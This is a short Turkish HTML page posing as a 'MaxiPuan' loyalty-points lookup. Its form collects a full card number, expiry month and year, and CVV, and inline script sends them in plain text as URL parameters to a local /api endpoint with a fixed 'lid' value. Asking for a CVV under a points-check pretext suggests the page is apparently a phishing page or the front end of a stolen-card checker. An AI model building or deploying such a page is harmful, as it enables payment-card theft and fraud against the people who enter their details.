<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>MaxiPuan Sorgulama</title>
</head>
<body>
  <h2>MaxiPuan Sorgulama</h2>
  <form id="form">
    <input type="text" id="cc" placeholder="Kart Numarası" required /><br>
    <input type="text" id="month" placeholder="Ay (örn: 05)" required /><br>
    <input type="text" id="year" placeholder="Yıl (örn: 2027)" required /><br>
    <input type="text" id="cvv" placeholder="CVV" required /><br>
    <button type="submit">Sorgula</button>
  </form>

  <div id="sonuc"></div>

  <script>
    const form = document.getElementById('form');
    const sonuc = document.getElementById('sonuc');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const cc = document.getElementById('cc').value;
      const month = document.getElementById('month').value;
      const year = document.getElementById('year').value;
      const cvv = document.getElementById('cvv').value;
      const lid = '45542';

      try {
        const response = await fetch(`/api?cc=${cc}&month=${month}&year=${year}&cvv=${cvv}&lid=${lid}`);
        const data = await response.json();
        sonuc.innerText = JSON.stringify(data);
      } catch (error) {
        sonuc.innerText = 'Hata oluştu';
      }
    });
  </script>
</body>
</html>
